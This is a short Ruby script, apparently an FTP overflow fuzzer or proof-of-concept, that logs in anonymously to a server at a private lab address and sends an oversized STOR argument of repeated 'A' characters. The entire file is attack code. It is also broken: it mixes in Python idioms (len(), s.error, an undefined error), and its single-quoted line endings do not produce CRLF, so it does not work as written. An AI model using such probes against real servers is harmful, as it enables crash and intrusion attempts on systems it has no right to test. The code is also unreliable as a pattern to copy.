require 'socket'

rhost = '172.16.162.136'

buffer = "A" * 100
buffer +='\r\n'

s = Socket.new Socket::AF_INET, Socket::SOCK_STREAM

loop do
        s.connect Socket.pack_sockaddr_in(21, rhost)    
        puts s.recv(2048)
        s.send('USER ftp\r\n')
        puts s.recv(2048)
        s.send('PASS ftp\r\n')
        puts s.recv(2048)
        s.send('STOR ' + buffer)
        puts s.recv(2048)
        s.close()
        puts "Sent Buffer of %s bytes" %len(buffer)
break if s.error
        s.close()
        puts error
end     